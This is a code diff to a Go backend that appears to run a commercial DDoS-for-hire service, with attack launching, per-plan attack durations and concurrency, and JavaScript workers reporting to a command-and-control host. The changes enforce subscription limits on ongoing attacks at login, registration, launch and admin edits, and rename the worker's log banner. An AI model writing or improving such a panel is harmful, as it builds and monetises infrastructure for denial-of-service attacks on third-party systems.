@@ -243,6 +243,31 @@ func handleLogin(w http.ResponseWriter, r *http.Request) {
 	token := generateToken()
 	SaveSessionToken(token, user.Username)
 
+	// Sync limits from plan on login
+	if pv, ok := plans.Load(user.Plan); ok {
+		p := pv.(Plan)
+		planOngoing := p.MaxOngoing
+		if planOngoing == 0 {
+			planOngoing = 1
+		}
+		changed := false
+		if user.MaxSeconds != p.MaxSeconds && user.MaxSeconds > p.MaxSeconds {
+			user.MaxSeconds = p.MaxSeconds
+			changed = true
+		}
+		if user.MaxConcurrents != p.MaxConcurrents && user.MaxConcurrents > p.MaxConcurrents {
+			user.MaxConcurrents = p.MaxConcurrents
+			changed = true
+		}
+		if user.MaxOngoing != planOngoing || user.MaxOngoing == 0 {
+			user.MaxOngoing = planOngoing
+			changed = true
+		}
+		if changed {
+			SaveUser(user)
+		}
+	}
+
 	jsonSuccess(w, map[string]interface{}{
 		"access_token": token,
 		"admin":        user.Rule == "Admin",
@@ -278,9 +303,17 @@ func handleRegister(w http.ResponseWriter, r *http.Request) {
 		Plan:           "Free",
 		JoinDate:       time.Now().Format(time.RFC3339),
 		ExpirationDate: "",
-		MaxConcurrents: 1,
-		MaxSeconds:     60,
 		APIKey:         generateToken(),
+	}
+	if pv, ok := plans.Load("Free"); ok {
+		p := pv.(Plan)
+		user.MaxConcurrents = p.MaxConcurrents
+		user.MaxOngoing = p.MaxOngoing
+		user.MaxSeconds = p.MaxSeconds
+	} else {
+		user.MaxConcurrents = 1
+		user.MaxOngoing = 1
+		user.MaxSeconds = 60
 	}
 	SaveUser(user)
 
@@ -804,6 +837,38 @@ func handleLaunch(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	// Sync user limits from plan so plan changes apply immediately
+	if pv, ok := plans.Load(user.Plan); ok {
+		p := pv.(Plan)
+		if user.MaxSeconds > p.MaxSeconds {
+			user.MaxSeconds = p.MaxSeconds
+		}
+		if user.MaxConcurrents > p.MaxConcurrents {
+			user.MaxConcurrents = p.MaxConcurrents
+		}
+		planOngoing := p.MaxOngoing
+		if planOngoing == 0 {
+			planOngoing = 1
+		}
+		if user.MaxOngoing > planOngoing || user.MaxOngoing == 0 {
+			user.MaxOngoing = planOngoing
+		}
+	}
+
+	if user.MaxOngoing > 0 {
+		ongoingCount := 0
+		allOngoing, _ := storage.GetAllOngoingAttacks()
+		for _, a := range allOngoing {
+			if a.Username == user.Username {
+				ongoingCount++
+			}
+		}
+		if ongoingCount >= user.MaxOngoing {
+			jsonError(w, fmt.Sprintf("You have reached your maximum ongoing attacks limit (%d)", user.MaxOngoing), 403)
+			return
+		}
+	}
+
 	duration := 30
 	if timeStr != "" {
 		fmt.Sscanf(timeStr, "%d", &duration)
@@ -1096,6 +1161,7 @@ func handleAdminUsersUpdate(w http.ResponseWriter, r *http.Request) {
 		if planV, ok := plans.Load(targetUser.Plan); ok {
 			p := planV.(Plan)
 			targetUser.MaxConcurrents = p.MaxConcurrents
+			targetUser.MaxOngoing = p.MaxOngoing
 			targetUser.MaxSeconds = p.MaxSeconds
 		}
 
@@ -1194,6 +1260,7 @@ func handleAdminAddUser(w http.ResponseWriter, r *http.Request) {
 	if pv, ok := plans.Load(u.Plan); ok {
 		p := pv.(Plan)
 		u.MaxConcurrents = p.MaxConcurrents
+		u.MaxOngoing = p.MaxOngoing
 		u.MaxSeconds = p.MaxSeconds
 	}
 
@@ -1452,7 +1519,7 @@ function heartbeat() {
 
 setInterval(heartbeat, 30000);
 heartbeat();
-console.log("levl7 worker " + WORKER_ID + " running on " + CNC_HOST);
+console.log("el7 worker " + WORKER_ID + " running on " + CNC_HOST);
 `, body.ServerIP, body.Port, workerID)
 
 	w.Header().Set("Content-Type", "application/javascript")
